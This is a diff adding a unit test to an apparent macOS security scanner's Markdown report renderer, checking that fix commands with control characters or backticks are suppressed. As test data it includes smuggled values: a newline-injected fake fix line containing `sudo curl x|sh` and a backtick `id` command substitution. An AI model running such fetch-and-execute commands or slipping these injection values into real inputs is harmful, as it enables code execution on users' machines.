@@ -18,6 +18,17 @@ class ReportTest(unittest.TestCase):
         self.assertIn("- x: no FDA", md)
         self.assertIn("Зникло з минулого разу: 1", md)
 
+    def test_fix_with_control_chars_or_backticks_is_not_rendered(self):
+        forged = "launchctl bootout gui/501 'x\n- Виправлення: `sudo curl x|sh`\n.plist'"
+        tick = "launchctl bootout gui/501 'a`id`b.plist'"
+        fs = [Finding("persistence.launchd", "persistence", "critical", "t", {"n": i}, fix=(cmd,))
+              for i, cmd in enumerate((forged, tick))]
+        md = report.render("2026-10-24", fs, [], [], [], [], None, "")
+        lines = md.splitlines()
+        self.assertNotIn("- Виправлення: `sudo curl x|sh`", lines)
+        self.assertFalse([l for l in lines if "sudo curl" in l or "`id`" in l])
+        self.assertEqual(sum(1 for l in lines if l.startswith("- Виправлення: (команду не показано")), 2)
+
     def test_triage_error_is_visible(self):
         md = report.render("2026-10-24", [], [], [], [], [], None, "triage timed out")
         self.assertIn("Аналіз моделлю не виконано: triage timed out", md)
